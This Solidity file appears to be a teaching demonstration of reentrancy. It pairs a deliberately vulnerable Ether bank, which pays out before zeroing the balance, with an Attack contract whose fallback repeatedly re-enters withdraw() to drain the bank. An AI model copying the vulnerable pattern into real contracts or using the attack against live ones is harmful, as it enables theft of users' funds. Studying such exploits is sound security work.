// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract badEtherStore {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 _senderBalance = balances[msg.sender];
        require(_senderBalance > 0, "Failed: empty account");
        (bool sent, bytes memory data) = msg.sender.call{value: _senderBalance}("");
        require(sent, "Failed to send Ether");
        balances[msg.sender] = 0;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract Attack {
    badEtherStore public bank;

    constructor(address _bankAddress) {
        bank = badEtherStore(_bankAddress);
    }

    fallback() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }

    function collect(uint256 _amount, address payable _address) public {
	    _address.transfer( _amount);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

